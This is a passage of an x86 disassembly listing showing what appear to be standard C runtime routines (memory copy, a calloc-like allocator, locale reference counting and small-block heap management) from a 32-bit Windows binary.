  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
